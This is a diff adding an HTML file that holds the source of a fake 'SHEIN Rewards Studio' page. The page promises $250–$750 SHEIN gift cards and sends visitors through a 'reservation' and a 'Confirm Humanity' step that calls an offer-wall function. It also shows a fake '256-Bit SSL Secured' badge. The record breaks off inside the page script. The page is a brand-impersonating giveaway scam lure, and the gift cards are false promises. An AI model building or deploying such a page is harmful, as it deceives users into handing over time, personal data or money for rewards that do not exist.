@@ -1,0 +1,327 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="Content-Style-Type" content="text/css">
+  <title></title>
+  <meta name="Generator" content="Cocoa HTML Writer">
+  <meta name="CocoaVersion" content="2575.4">
+  <style type="text/css">
+    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica}
+    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica; min-height: 14.0px}
+  </style>
+</head>
+<body>
+<p class="p1">&lt;!DOCTYPE html&gt;</p>
+<p class="p1">&lt;html lang="en"&gt;</p>
+<p class="p1">&lt;head&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;meta charset="UTF-8"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;title&gt;SHEIN Rewards Studio | Member Access&lt;/title&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- Tailwind CSS --&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;script src="https://cdn.tailwindcss.com"&gt;&lt;/script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- Google Fonts --&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&amp;family=Playfair+Display:ital,wght@0,400;0,600;1,400;1,700&amp;display=swap" rel="stylesheet"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;style&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>:root {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>--champagne: #f7ede2;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>--gold-accent: #c5a059;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>--onyx: #1a1a1a;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>--soft-white: #ffffff;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>body {<span class="Apple-converted-space"> </span></p>
+<p class="p1"><span class="Apple-converted-space">            </span>font-family: 'Montserrat', sans-serif;<span class="Apple-converted-space"> </span></p>
+<p class="p1"><span class="Apple-converted-space">            </span>background-color: var(--soft-white);<span class="Apple-converted-space"> </span></p>
+<p class="p1"><span class="Apple-converted-space">            </span>scroll-behavior: smooth;<span class="Apple-converted-space"> </span></p>
+<p class="p1"><span class="Apple-converted-space">            </span>color: var(--onyx);</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>h1, h2, h3, h4 { font-family: 'Playfair Display', serif; }</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>/* Floating Luxury Header */</p>
+<p class="p1"><span class="Apple-converted-space">        </span>.nav-glass {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>background: rgba(255, 255, 255, 0.8);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>backdrop-filter: blur(15px);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>border-bottom: 1px solid rgba(0, 0, 0, 0.05);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>transition: all 0.3s ease;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>.nav-link {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>position: relative;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>transition: color 0.3s ease;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>.nav-link::after {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>content: '';</p>
+<p class="p1"><span class="Apple-converted-space">            </span>position: absolute;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>bottom: -4px;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>left: 0;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>width: 0;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>height: 1px;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>background: var(--gold-accent);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>transition: width 0.3s ease;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>.nav-link:hover::after {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>width: 100%;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>/* Hero Layout Fix */</p>
+<p class="p1"><span class="Apple-converted-space">        </span>.hero-split {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>display: grid;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>grid-template-columns: 1.2fr 0.8fr;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>min-height: 90vh;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>align-items: center;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>@media (max-width: 1024px) {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>.hero-split {</p>
+<p class="p1"><span class="Apple-converted-space">                </span>grid-template-columns: 1fr;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>text-align: center;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>padding-top: 120px;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>}</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>.hero-image-box {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>position: relative;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>height: 80vh;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>width: 100%;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>border-radius: 200px 0 0 200px;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>overflow: hidden;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>box-shadow: -20px 20px 60px rgba(0,0,0,0.05);</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>@media (max-width: 1024px) {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>.hero-image-box {</p>
+<p class="p1"><span class="Apple-converted-space">                </span>height: 400px;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>border-radius: 40px;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>margin-top: 40px;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>}</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>.btn-luxury {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>background: var(--onyx);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>color: white;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>cursor: pointer;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>letter-spacing: 0.15em;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><span class="Apple-converted-space">        </span></p>
+<p class="p1"><span class="Apple-converted-space">        </span>.btn-luxury:hover {<span class="Apple-converted-space"> </span></p>
+<p class="p1"><span class="Apple-converted-space">            </span>background: var(--gold-accent);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>transform: translateY(-3px);<span class="Apple-converted-space"> </span></p>
+<p class="p1"><span class="Apple-converted-space">            </span>box-shadow: 0 15px 30px rgba(197, 160, 89, 0.2);<span class="Apple-converted-space"> </span></p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>.fade-in { animation: fadeIn 1.2s ease-out forwards; }</p>
+<p class="p1"><span class="Apple-converted-space">        </span>@keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>.modal-overlay { background: rgba(26, 26, 26, 0.8); backdrop-filter: blur(10px); }</p>
+<p class="p1"><span class="Apple-converted-space">        </span>.section-accent { background-color: var(--champagne); }</p>
+<p class="p1"><span class="Apple-converted-space">        </span>.reward-card {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>background: white;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>border: 1px solid rgba(0,0,0,0.03);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>transition: all 0.3s ease;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p1"><span class="Apple-converted-space">        </span>.reward-card:hover {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>border-color: var(--gold-accent);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>transform: translateY(-10px);</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/style&gt;</p>
+<p class="p1">&lt;/head&gt;</p>
+<p class="p1">&lt;body class="antialiased overflow-x-hidden"&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- NAVIGATION: Redesigned for Luxury --&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;nav class="nav-glass fixed top-0 w-full z-[100] py-5 px-8 md:px-16 flex justify-between items-center"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="flex flex-col"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;span class="text-2xl font-bold tracking-[0.5em] text-black leading-none uppercase"&gt;SHEIN&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;span class="text-[9px] tracking-[0.6em] text-gold-accent font-bold mt-1 uppercase"&gt;Rewards Studio&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
+<p class="p2"><span class="Apple-converted-space">        </span></p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="hidden md:flex items-center space-x-12"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="flex space-x-10 text-[10px] uppercase tracking-[0.2em] font-bold"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;a href="javascript:void(0)" onclick="scrollToSection('rewards')" class="nav-link"&gt;Collections&lt;/a&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;a href="javascript:void(0)" onclick="scrollToSection('how-it-works')" class="nav-link"&gt;The Process&lt;/a&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;a href="javascript:void(0)" onclick="scrollToSection('verify')" class="nav-link"&gt;Support&lt;/a&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;button onclick="scrollToSection('rewards')" class="border border-black px-6 py-2 rounded-full text-[9px] font-bold uppercase tracking-widest hover:bg-black hover:text-white transition"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>Access Rewards</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/button&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;!-- Mobile Menu Placeholder --&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="md:hidden"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"&gt;&lt;path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"&gt;&lt;/path&gt;&lt;/svg&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/nav&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- HERO SECTION: Redesigned Split Layout --&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;section class="relative bg-white"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="container mx-auto px-6 lg:px-16 hero-split"&gt;</p>
+<p class="p2"><span class="Apple-converted-space">            </span></p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;!-- Left Side: Clean Typography --&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="fade-in pr-0 lg:pr-20"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="inline-flex items-center space-x-4 mb-6"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;span class="h-[1px] w-8 bg-gold-accent"&gt;&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;span class="text-[10px] uppercase tracking-[0.4em] text-gold-accent font-bold"&gt;Exclusively for Members&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;h1 class="text-6xl md:text-8xl lg:text-9xl mb-8 leading-[0.9]"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>Luxury &lt;br&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;span class="italic font-light text-gray-300"&gt;Gift Cards&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/h1&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;p class="text-gray-500 text-lg md:text-xl max-w-xl leading-relaxed font-light mb-12"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>Experience the next level of fashion rewards. Our Studio provides verified users with premium SHEIN Gift Cards ranging from &lt;span class="text-black font-medium"&gt;$250 to $750&lt;/span&gt;.</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="flex flex-col sm:flex-row gap-6"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;button onclick="scrollToSection('rewards')" class="btn-luxury px-12 py-6 rounded-full text-[11px] font-bold uppercase shadow-2xl"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                        </span>Claim Your Credit</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;/button&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;button onclick="scrollToSection('how-it-works')" class="group flex items-center space-x-4 text-[11px] font-bold uppercase tracking-widest"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                        </span>&lt;span&gt;How it works&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                        </span>&lt;span class="w-8 h-8 rounded-full border border-gray-200 flex items-center justify-center group-hover:bg-black group-hover:text-white transition"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                            </span>&lt;svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"&gt;&lt;path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"&gt;&lt;/path&gt;&lt;/svg&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                        </span>&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;/button&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;!-- Right Side: Editorial Visual --&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="fade-in" style="animation-delay: 0.3s;"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="hero-image-box"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;img src="https://images.unsplash.com/photo-1490481651871-ab68de25d43d?q=80&amp;w=1200&amp;auto=format&amp;fit=crop"<span class="Apple-converted-space"> </span></p>
+<p class="p1"><span class="Apple-converted-space">                         </span>alt="High-end Fashion"<span class="Apple-converted-space"> </span></p>
+<p class="p1"><span class="Apple-converted-space">                         </span>class="w-full h-full object-cover"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/section&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- PHASE 2: REWARD SELECTION --&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;section id="rewards" class="py-32 section-accent"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="container mx-auto px-6"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="text-center mb-20"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;h2 class="text-5xl md:text-6xl mb-6 font-bold"&gt;The Reward Suite&lt;/h2&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;p class="text-gray-500 max-w-xl mx-auto font-light leading-relaxed"&gt;Choose your preferred SHEIN gift card amount to begin the verification process.&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="grid lg:grid-cols-3 gap-12"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;!-- Reward 1 --&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="reward-card rounded-[40px] p-12 flex flex-col items-center text-center shadow-xl shadow-gray-200/50"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="text-[10px] uppercase tracking-[0.4em] text-gray-400 mb-10 font-bold"&gt;Boutique Access&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="text-6xl font-bold mb-4"&gt;$250&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;p class="text-gray-400 text-sm mb-12 font-light italic"&gt;SHEIN GIFT CARD&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;button onclick="openConfirmation('$250 Gift Card')" class="w-full py-5 rounded-full border-2 border-gray-100 text-[10px] uppercase tracking-widest font-bold hover:bg-black hover:text-white transition-all"&gt;Select Tier&lt;/button&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;!-- Reward 2: Featured --&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="reward-card rounded-[40px] p-12 flex flex-col items-center text-center ring-4 ring-gold-accent relative shadow-2xl"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="absolute -top-5 left-1/2 -translate-x-1/2 bg-gold-accent text-white px-8 py-2 rounded-full text-[10px] uppercase tracking-[0.3em] font-bold shadow-lg"&gt;Featured Selection&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="text-[10px] uppercase tracking-[0.4em] text-gold-accent font-bold mb-10 mt-4"&gt;Premium Studio&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="text-7xl font-bold mb-4"&gt;$500&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;p class="text-gray-400 text-sm mb-12 font-light italic"&gt;SHEIN GIFT CARD&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;button onclick="openConfirmation('$500 Gift Card')" class="w-full btn-luxury py-6 rounded-full text-[10px] uppercase tracking-widest font-bold shadow-xl"&gt;Select Premium&lt;/button&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;!-- Reward 3 --&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="reward-card rounded-[40px] p-12 flex flex-col items-center text-center shadow-xl shadow-gray-200/50"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="text-[10px] uppercase tracking-[0.4em] text-gray-400 mb-10 font-bold"&gt;Elite Wardrobe&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="text-6xl font-bold mb-4"&gt;$750&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;p class="text-gray-400 text-sm mb-12 font-light italic"&gt;SHEIN GIFT CARD&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;button onclick="openConfirmation('$750 Gift Card')" class="w-full py-5 rounded-full border-2 border-gray-100 text-[10px] uppercase tracking-widest font-bold hover:bg-black hover:text-white transition-all"&gt;Select Tier&lt;/button&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/section&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- FOOTER --&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;footer class="bg-white border-t border-gray-100 py-24 px-6 text-center" id="verify"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="text-2xl font-bold tracking-[0.5em] text-black mb-8 uppercase"&gt;SHEIN STUDIO&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;p class="text-[10px] text-gray-400 uppercase tracking-[0.3em] max-w-lg mx-auto leading-loose mb-10"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>Rewards are subject to member verification and inventory availability. Not officially affiliated with SHEIN Inc.</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="flex justify-center space-x-8 text-[9px] uppercase tracking-widest text-gray-400 font-bold"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;a href="#" class="hover:text-gold-accent transition"&gt;Privacy Policy&lt;/a&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;a href="#" class="hover:text-gold-accent transition"&gt;Terms of Service&lt;/a&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;a href="#" class="hover:text-gold-accent transition"&gt;Support&lt;/a&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/footer&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- MODALS &amp; SCRIPT REMAIN THE SAME --&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;div id="confirmationModal" class="fixed inset-0 z-[200] hidden flex items-center justify-center px-4"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="modal-overlay absolute inset-0" onclick="closeConfirmation()"&gt;&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="bg-white max-w-md w-full rounded-[60px] p-12 relative z-10 shadow-2xl text-center fade-in"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="mb-10"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;span class="inline-block px-5 py-2 rounded-full border border-gold-accent text-gold-accent text-[9px] uppercase tracking-widest font-bold mb-6"&gt;Reservation Successful&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;h3 class="text-4xl"&gt;Release &lt;span id="selectedTier" class="italic"&gt;&lt;/span&gt;?&lt;/h3&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;p class="text-gray-500 mb-10 text-sm font-light leading-relaxed"&gt;Your reward has been temporarily reserved. To release the digital code, please complete the secure human-validation step.&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;button onclick="goToVerification()" class="w-full btn-luxury py-6 rounded-full text-[11px] font-bold uppercase shadow-2xl"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>Start Secure Verification</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/button&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/div&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- VERIFICATION PAGE --&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;div id="verificationScreen" class="fixed inset-0 z-[210] hidden bg-white flex flex-col items-center justify-center px-6 text-center"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="max-w-md w-full space-y-12 fade-in"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="space-y-6"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="mx-auto w-16 h-16 text-gold-accent mb-8"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;svg fill="none" stroke="currentColor" viewBox="0 0 24 24"&gt;&lt;path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"&gt;&lt;/path&gt;&lt;/svg&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;h2 class="text-5xl md:text-6xl leading-[0.9]"&gt;Member &lt;br&gt;Validation&lt;/h2&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;p class="text-gray-500 text-sm font-light italic"&gt;Confirm your status to release your gift card.&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
+<p class="p2"><span class="Apple-converted-space">            </span></p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="p-10 border border-gray-100 rounded-[50px] bg-[#fdfaf8] shadow-inner"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;button onclick="triggerOfferWall()" id="verifyBtn" class="w-full btn-luxury py-6 rounded-full text-[11px] font-bold uppercase shadow-2xl mb-8"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>Confirm Humanity</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/button&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="flex items-center justify-center space-x-3"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"&gt;&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>&lt;span class="text-[10px] text-gray-400 uppercase tracking-[0.3em] font-bold"&gt;256-Bit SSL Secured&lt;/span&gt;</p>
+<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>&lt;div id="loadingStatus" class="hidden text-gold-accent font-bold text-xs uppercase tracking-widest animate-pulse"&gt;Routing to gateway...&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/div&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>function scrollToSection(id) {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>const element = document.getElementById(id);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>if (element) {</p>
+<p class="p1"><span class="Apple-converted-space">                </span>element.scrollIntoView({ behavior: 'smooth' });</p>
+<p class="p1"><span class="Apple-converted-space">            </span>}</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>function openConfirmation(tierName) {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>document.getElementById('selectedTier').innerText = tierName;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>document.getElementById('confirmationModal').classList.remove('hidden');</p>
+<p class="p1"><span class="Apple-converted-space">            </span>document.body.style.overflow = 'hidden';</p>
